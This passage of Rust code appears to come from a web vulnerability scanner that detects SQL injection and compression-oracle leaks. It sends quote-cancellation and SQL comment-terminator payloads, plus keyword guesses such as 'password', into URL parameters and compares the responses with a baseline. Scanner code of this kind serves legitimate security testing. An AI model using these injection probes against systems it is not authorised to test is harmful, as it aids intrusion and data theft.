            .unwrap_or_else(|| "test".to_string());

        // Test: value'' should equal value if SQL escaping is applied
        let cancelled_payload = format!("{}''", current_value);
        let cancelled_url = self.build_test_url(base_url, parameter, &cancelled_payload);

        // Also test double-double: value'''' should equal value
        let double_cancelled = format!("{}''''", current_value);
        let double_url = self.build_test_url(base_url, parameter, &double_cancelled);

        let mut matches = 0;
        let mut total_tests = 0;

        // Test single cancellation
        for _ in 0..3 {
            if let Ok(resp) = self.http_client.get(&cancelled_url).await {
                total_tests += 1;
                let sim = self.calculate_similarity(baseline, &resp);
                if sim > 0.85 {
                    matches += 1;
                }
            }
        }

        // Test double cancellation
        for _ in 0..2 {
            if let Ok(resp) = self.http_client.get(&double_url).await {
                total_tests += 1;
                let sim = self.calculate_similarity(baseline, &resp);
                if sim > 0.85 {
                    matches += 1;
                }
            }
        }

        if total_tests >= 3 {
            let match_ratio = matches as f64 / total_tests as f64;

            if match_ratio > 0.6 {
                let probability = if match_ratio > 0.8 {
                    0.92 // Strong: most tests show cancellation
                } else {
                    0.78 // Moderate: some tests show cancellation
                };

                signals.push(Signal::new(
                    SignalType::QuoteCancellation,
                    probability,
                    match_ratio,
                    &format!(
                        "Quote cancellation: {}'' matches baseline ({}/{})",
                        current_value, matches, total_tests
                    ),
                ));
            }
        }

        signals
    }

    /// Comment Injection Detection
    ///
    /// Tests if value'-- returns same as value (comment terminates query).
    /// This is a classic SQLi indicator:
    /// - In SQL: 'test'-- comments out rest of query
    /// - Remaining query still executes normally
    async fn analyze_comment_injection(
        &self,
        base_url: &str,
        parameter: &str,
        baseline: &HttpResponse,
    ) -> Vec<Signal> {
        let mut signals = Vec::new();

        let current_value = self.extract_param_value(base_url, parameter)
            .unwrap_or_else(|| "1".to_string());

        // Test comment styles for different databases
        let comment_payloads: [(&str, &str); 4] = [
            ("--", "SQL single-line"),
            ("-- ", "SQL single-line with space"),
            ("#", "MySQL hash comment"),
            ("/**/", "SQL block comment"),
        ];

        let mut detected_comments = Vec::new();

        for (comment, style) in &comment_payloads {
            let payload = format!("{}{}", current_value, comment);
            let url = self.build_test_url(base_url, parameter, &payload);

            let mut similarities: Vec<f64> = Vec::new();
            for _ in 0..3 {
                if let Ok(resp) = self.http_client.get(&url).await {
                    let sim = self.calculate_similarity(baseline, &resp);
                    similarities.push(sim);
                }
            }

            if similarities.len() >= 2 {
                let avg_sim: f64 = similarities.iter().sum::<f64>() / similarities.len() as f64;
                if avg_sim > 0.85 {
                    detected_comments.push((*style, avg_sim));
                }
            }
        }

        if !detected_comments.is_empty() {
            // Multiple comment styles working = stronger signal
            let probability = if detected_comments.len() >= 2 {
                0.95 // Multiple styles work
            } else {
                0.88 // Single style works
            };

            let styles: Vec<&str> = detected_comments.iter().map(|(s, _)| *s).collect();
            signals.push(Signal::new(
                SignalType::CommentInjection,
                probability,
                detected_comments.len() as f64,
                &format!(
                    "Comment injection: {} style(s) work ({})",
                    detected_comments.len(),
                    styles.join(", ")
                ),
            ));
        }

        signals
    }

    /// Compression Oracle Detection
    ///
    /// Detects information leakage via response compression (BREACH-style).
    /// If response is compressed, injecting guessed content that matches
    /// actual content will result in smaller responses.
    async fn analyze_compression_oracle(
        &self,
        base_url: &str,
        parameter: &str,
        baseline: &HttpResponse,
    ) -> Vec<Signal> {
        let mut signals = Vec::new();

        // Check if response is compressed
        let content_encoding = baseline.headers.get("content-encoding")
            .or_else(|| baseline.headers.get("Content-Encoding"));

        let is_compressed = content_encoding
            .map(|v| v.contains("gzip") || v.contains("deflate") || v.contains("br"))
            .unwrap_or(false);

        if !is_compressed {
            // No compression = no oracle
            return signals;
        }

        let current_value = self.extract_param_value(base_url, parameter)
            .unwrap_or_else(|| "test".to_string());

        // Test: inject values that might match content in response
        // If they match, compression will be better (smaller response)
        let test_payloads: [(&str, &str); 5] = [
            ("password", "common_keyword"),
            ("username", "common_keyword"),
            ("admin", "common_keyword"),
            ("secret", "common_keyword"),
            ("AAAAAAAAAA", "control_no_match"),
        ];

        let mut response_sizes: Vec<(&str, usize)> = Vec::new();

        for (guess, label) in &test_payloads {
            let payload = format!("{}{}", current_value, guess);
            let url = self.build_test_url(base_url, parameter, &payload);

            if let Ok(resp) = self.http_client.get(&url).await {
                response_sizes.push((label, resp.body.len()));
            }
        }

        if response_sizes.len() >= 4 {
            // Check if any common keywords produce smaller responses than control
            let control_size = response_sizes.iter()
                .find(|(l, _)| *l == "control_no_match")
                .map(|(_, s)| *s)
                .unwrap_or(baseline.body.len());

            let smaller_responses: Vec<_> = response_sizes.iter()
                .filter(|(l, s)| *l != "control_no_match" && *s < control_size - 10)
                .collect();

            if !smaller_responses.is_empty() {
                let probability = if smaller_responses.len() >= 2 {
                    0.85
                } else {
                    0.7
                };

                signals.push(Signal::new(
                    SignalType::Compression,
                    probability,
                    smaller_responses.len() as f64,
                    &format!(
                        "Compression oracle: {} keyword(s) produced smaller response",
                        smaller_responses.len()
                    ),
                ));
            }
        }

        signals
    }

    /// Bootstrap resampling for timing difference confidence interval
    fn bootstrap_timing_diff(&self, a: &[f64], b: &[f64], n_resamples: usize) -> Vec<f64> {
        use std::collections::hash_map::DefaultHasher;
        use std::hash::{Hash, Hasher};

        let mut diffs = Vec::with_capacity(n_resamples);

        for i in 0..n_resamples {
            // Simple deterministic "random" selection based on index
            let mut hasher = DefaultHasher::new();
            i.hash(&mut hasher);
            let seed = hasher.finish();

            let a_sample: Vec<f64> = (0..a.len())
                .map(|j| a[(seed as usize + j * 7) % a.len()])
                .collect();
            let b_sample: Vec<f64> = (0..b.len())
                .map(|j| b[(seed as usize + j * 13) % b.len()])
                .collect();

            let a_mean = a_sample.iter().sum::<f64>() / a_sample.len() as f64;
            let b_mean = b_sample.iter().sum::<f64>() / b_sample.len() as f64;
            diffs.push(b_mean - a_mean);
        }

        diffs
    }

    /// Calculate 95% confidence interval from bootstrap samples
    fn confidence_interval_95(&self, samples: &[f64]) -> (f64, f64) {
        if samples.is_empty() {
            return (0.0, 0.0);
        }

        let mut sorted = samples.to_vec();
        sorted.sort_by(|a, b| a.partial_cmp(b).unwrap());

        let low_idx = (samples.len() as f64 * 0.025) as usize;
        let high_idx = (samples.len() as f64 * 0.975) as usize;

        (
            sorted.get(low_idx).copied().unwrap_or(0.0),
            sorted.get(high_idx.min(sorted.len() - 1)).copied().unwrap_or(0.0),
        )
    }

    /// Calculate similarity between two responses (0.0 to 1.0)
    ///
    /// Unified similarity function with configurable weighting:
    /// - Status code match: 20-30% weight
    /// - Length ratio: 30-40% weight
    /// - Content hash: 30-50% weight (exact match detection)
    fn calculate_similarity(&self, a: &HttpResponse, b: &HttpResponse) -> f64 {
        // Length similarity: relative difference
        let len_a = a.body.len() as f64;
        let len_b = b.body.len() as f64;
        let len_ratio = 1.0 - (len_a - len_b).abs() / len_a.max(len_b).max(1.0);

        // Status code match
        let status_match = if a.status_code == b.status_code { 1.0 } else { 0.0 };

        // Content hash (structural similarity via FNV-1a)
        let hash_a = self.fnv1a_hash(&a.body);
        let hash_b = self.fnv1a_hash(&b.body);
        let hash_match = if hash_a == hash_b { 1.0 } else { 0.0 };

        // Weighted combination
        // If exact hash match, that's very strong evidence
        if hash_match > 0.5 {
            0.2 * status_match + 0.3 * len_ratio + 0.5 * hash_match
        } else {
            // No exact match - rely more on length and status
            0.3 * status_match + 0.5 * len_ratio + 0.2 * (if len_ratio > 0.95 { 1.0 } else { 0.0 })
        }
    }

    /// FNV-1a hash for structural content comparison
    fn fnv1a_hash(&self, s: &str) -> u64 {
        let mut h: u64 = 0xcbf29ce484222325; // FNV offset basis
        for b in s.bytes() {
            h ^= b as u64;
            h = h.wrapping_mul(0x100000001b3); // FNV prime
        }
        h
    }

    fn extract_param_value(&self, url: &str, param: &str) -> Option<String> {
        url::Url::parse(url).ok().and_then(|parsed| {
            parsed.query_pairs()
                .find(|(name, _)| name == param)
                .map(|(_, value)| value.to_string())
        })
    }

    fn build_test_url(&self, base_url: &str, param_name: &str, payload: &str) -> String {
        if let Ok(mut parsed) = url::Url::parse(base_url) {
            let existing: Vec<(String, String)> = parsed
                .query_pairs()
                .filter(|(name, _)| name != param_name)
                .map(|(n, v)| (n.to_string(), v.to_string()))
                .collect();

            parsed.set_query(None);
            {
                let mut qp = parsed.query_pairs_mut();
                for (name, value) in &existing {
                    qp.append_pair(name, value);
                }
                qp.append_pair(param_name, payload);
            }
            parsed.to_string()
        } else {
            format!("{}?{}={}", base_url, param_name, urlencoding::encode(payload))
        }
    }
}

/// Boolean oracle state for data extraction
#[derive(Debug, Clone)]
struct BooleanOracle {
    is_working: bool,
    true_length: usize,
    false_length: usize,
    baseline_length: usize,
}

/// Result of side-channel analysis
#[derive(Debug)]
pub struct SideChannelResult {
    pub url: String,
    pub parameter: String,
    pub combined: CombinedResult,
    pub all_signals: Vec<Signal>,
}

impl SideChannelResult {
    /// Is this likely a vulnerability?
    pub fn is_likely_vulnerable(&self) -> bool {
        self.combined.probability > 0.7 && self.combined.signals_used >= 2
    }

    /// Is this a confirmed vulnerability?
    pub fn is_confirmed(&self) -> bool {
        self.combined.probability > 0.9 && self.combined.signals_used >= 3
    }

    /// Get a summary for logging
    pub fn summary(&self) -> String {
        format!(
            "P={:.1}% confidence={} signals={}/{}\n{}",
            self.combined.probability * 100.0,
            self.combined.confidence,
            self.combined.signals_used,
            self.all_signals.len(),
            self.combined.explanation
        )
    }
}
